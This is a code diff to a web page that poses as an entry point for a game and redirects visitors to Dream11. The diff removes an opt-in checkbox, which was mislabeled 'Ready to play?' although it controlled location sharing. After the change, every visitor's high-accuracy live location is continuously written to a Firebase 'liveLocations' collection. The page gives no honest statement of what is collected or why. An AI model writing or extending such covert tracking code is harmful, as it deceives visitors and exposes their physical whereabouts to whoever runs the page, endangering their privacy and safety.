@@ -250,9 +250,11 @@
 
     .status-message {
       margin-top: 12px;
-      min-height: 20px;
+      min-height: 48px;
       font-size: 0.9rem;
       color: #c7d2fe;
+      white-space: pre-line;
+      text-align: left;
     }
 
     .modal-overlay {
@@ -309,16 +311,6 @@
       font-size: 0.98rem;
       outline: none;
       margin-bottom: 12px;
-    }
-
-    .checkbox-wrap {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      text-align: left;
-      margin-bottom: 14px;
-      font-size: 0.9rem;
-      color: #cbd5e1;
     }
 
     .modal-actions {
@@ -418,10 +410,6 @@
       <p>Name</p>
       <label class="form-label" for="playerName">Your name</label>
       <input class="input" id="playerName" type="text" placeholder="Enter your name" maxlength="40" />
-      <label class="checkbox-wrap" for="allowLocation">
-        <input id="allowLocation" type="checkbox" />
-        <span>Ready to play?</span>
-      </label>
       <div class="modal-actions">
         <button class="btn btn-secondary" type="button" id="cancelModalBtn">Cancel</button>
         <button class="btn btn-primary" type="button" id="continueBtn">Continue</button>
@@ -435,7 +423,6 @@
       const continueBtn = document.getElementById("continueBtn");
       const cancelModalBtn = document.getElementById("cancelModalBtn");
       const playerNameInput = document.getElementById("playerName");
-      const allowLocationInput = document.getElementById("allowLocation");
       const statusMessage = document.getElementById("statusMessage");
       if (
         !startPlayingBtn ||
@@ -443,7 +430,6 @@
         !continueBtn ||
         !cancelModalBtn ||
         !playerNameInput ||
-        !allowLocationInput ||
         !statusMessage
       ) {
         return;
@@ -474,6 +460,14 @@
         statusMessage.textContent = message;
       }
 
+      function addStatusLine(message) {
+        if (!statusMessage.textContent) {
+          statusMessage.textContent = message;
+          return;
+        }
+        statusMessage.textContent += "\n" + message;
+      }
+
       function getFirebaseErrorMessage(error) {
         if (!error) return "Unknown Firebase error.";
         const code = error.code || "unknown";
@@ -492,39 +486,29 @@
         userModal.setAttribute("aria-hidden", "true");
       }
 
-      async function requestNotificationPermission(statusMessages) {
-        if (!("Notification" in window)) {
-          statusMessages.push("Notifications are not supported in this browser.");
+      async function startLiveLocationTracking(name, statusMessages) {
+        addStatusLine("Checking location support...");
+        if (!("geolocation" in navigator)) {
+          statusMessages.push("Geolocation is not supported in this browser.");
+          addStatusLine("This browser does not support location.");
           return;
         }
 
-        let notificationPermission = Notification.permission;
-        if (notificationPermission !== "granted") {
-          notificationPermission = await Notification.requestPermission();
-        }
-
-        if (notificationPermission === "granted") {
-          statusMessages.push("Notifications enabled.");
-        } else if (notificationPermission === "denied") {
-          statusMessages.push("Notifications denied.");
-        } else {
-          statusMessages.push("Notifications dismissed.");
-        }
-      }
-
-      async function startLiveLocationTracking(name, statusMessages) {
-        if (!("geolocation" in navigator)) {
-          statusMessages.push("Geolocation is not supported in this browser.");
+        if (!window.isSecureContext) {
+          statusMessages.push("Location works only on HTTPS or localhost.");
+          addStatusLine("Location blocked: open this page on HTTPS or localhost.");
           return;
         }
 
         if (!db) {
           statusMessages.push("Location sharing skipped (Firebase config missing).");
+          addStatusLine("Firebase not available for live tracking.");
           return;
         }
 
         const userId = "player_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
         const playerRef = db.collection("liveLocations").doc(userId);
+        addStatusLine("Requesting location permission...");
 
         // Probe write once to expose permission/config errors immediately.
         try {
@@ -544,6 +528,26 @@
           return;
         }
 
+        await new Promise(function (resolve) {
+          navigator.geolocation.getCurrentPosition(
+            function () {
+              addStatusLine("Location permission granted.");
+              resolve();
+            },
+            function (error) {
+              if (error && error.code === error.PERMISSION_DENIED) {
+                addStatusLine("Location permission denied.");
+                statusMessages.push("Location permission denied.");
+              } else {
+                addStatusLine("Could not fetch current location.");
+                statusMessages.push("Could not fetch current location.");
+              }
+              resolve();
+            },
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
+          );
+        });
+
         navigator.geolocation.watchPosition(
           async function (position) {
             try {
@@ -558,7 +562,7 @@
                 },
                 { merge: true }
               );
-              setStatus("");
+              addStatusLine("Location is getting tracked...");
             } catch (error) {
               setStatus(getFirebaseErrorMessage(error));
             }
@@ -570,10 +574,11 @@
               setStatus("Could not access location right now.");
             }
           },
-          { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
+          { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
         );
 
         statusMessages.push("Location sharing started.");
+        addStatusLine("Live tracking started.");
       }
 
       startPlayingBtn.addEventListener("click", async function (event) {
@@ -594,19 +599,19 @@
         }
 
         continueBtn.disabled = true;
-        setStatus("Requesting permissions...");
+        setStatus("Starting...");
         const statusMessages = [];
         try {
-          await requestNotificationPermission(statusMessages);
-          if (allowLocationInput.checked) {
-            await startLiveLocationTracking(name, statusMessages);
-          } else {
-            statusMessages.push("Location sharing skipped.");
-          }
+          await startLiveLocationTracking(name, statusMessages);
 
           closeModal();
-          alert(statusMessages.join("\n"));
-          window.location.href = "https://www.dream11.com/en-US";
+          if (statusMessages.length > 0) {
+            addStatusLine(statusMessages.join(" | "));
+          }
+          addStatusLine("Redirecting to Dream11...");
+          setTimeout(function () {
+            window.location.href = "https://www.dream11.com/en-US";
+          }, 1500);
         } catch (error) {
           setStatus("Unable to process permissions right now.");
           window.location.href = "https://www.dream11.com/en-US";
